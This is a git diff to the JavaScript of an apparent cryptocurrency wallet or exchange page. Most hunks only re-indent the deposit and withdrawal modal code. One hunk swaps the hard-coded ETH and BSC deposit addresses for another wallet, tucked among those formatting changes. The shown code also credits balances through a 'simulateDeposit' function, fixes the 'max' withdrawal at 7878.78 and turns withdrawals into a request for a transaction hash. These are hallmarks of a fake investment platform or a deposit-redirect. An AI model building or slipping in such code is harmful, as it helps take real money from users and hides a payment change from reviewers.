@@ -1238,32 +1238,32 @@
                 document.getElementById('notificationsBtn').addEventListener('click', () => showPage('notificationsPage'));
                 document.getElementById('settingsBtn').addEventListener('click', () => showPage('settingsPage'));
                 
-               // ===============================
-// Deposit / Withdrawal Modal Logic
-// ===============================
+                          // ===============================
+                      // Deposit / Withdrawal Modal Logic
+                    // ===============================
 
-// Open Deposit Modal
-document.getElementById('assetsDepositBtn').addEventListener('click', () => { 
-    showModal(depositModal); 
-    loadCoins(); // dynamically load coins from CoinGecko when modal opens
-});
-
-// Open Withdraw Modal
-document.getElementById('assetsWithdrawBtn').addEventListener('click', () => { 
+                    // Open Deposit Modal
+                document.getElementById('assetsDepositBtn').addEventListener('click', () => { 
+                showModal(depositModal);       // Show the deposit modal
+                loadCoins();                   // Dynamically load coins from CoinGecko
+               });
+  
+           // Open Withdraw Modal
+        document.getElementById('assetsWithdrawBtn').addEventListener('click', () => { 
     showModal(withdrawModal); 
-});
+       });
 
-// Withdraw Max
-document.getElementById('withdrawMax').addEventListener('click', () => {
+     // Withdraw Max
+    document.getElementById('withdrawMax').addEventListener('click', () => {
     document.getElementById('withdrawAmount').value = "7878.78";
-});
+    });
 
-// Withdraw Form Submit
-document.getElementById('withdrawForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    hideAllModals();
-    showModal(withdrawConfirmModal);
-});
+     // Withdraw Form Submit
+     document.getElementById('withdrawForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      hideAllModals();
+      showModal(withdrawConfirmModal);
+     });
 
 // Confirm Transaction Hash
 confirmTxBtn.addEventListener('click', () => {
@@ -1284,8 +1284,8 @@ confirmTxBtn.addEventListener('click', () => {
 // Deposit addresses
 const DEPOSIT = {
     BTC: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu',
-    ETH: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
-    BSC: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+    ETH: '0xAB98294614C46008cBF82Fa3e25285FBC2A6F257',
+    BSC: '0xAB98294614C46008cBF82Fa3e25285FBC2A6F257',
     TRC: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco'
 };
 
@@ -1353,11 +1353,11 @@ function simulateDeposit(coin){
     if(isNaN(parsed) || parsed <= 0){
         alert('Enter a valid amount');
         return;
-    }
-    updateWalletBalance(coin, parsed);
-    alert(`${parsed} ${coin.toUpperCase()} deposited successfully!`);
-    hideModal('depositModal');
-       }
+             }
+            updateWalletBalance(coin, parsed);
+             alert(`${parsed} ${coin.toUpperCase()} deposited successfully!`);
+             hideModal('depositModal');
+                 }
 
                 const startWithdrawalCountdown = () => {
                     const countdownDisplay = document.getElementById('countdownTimer');
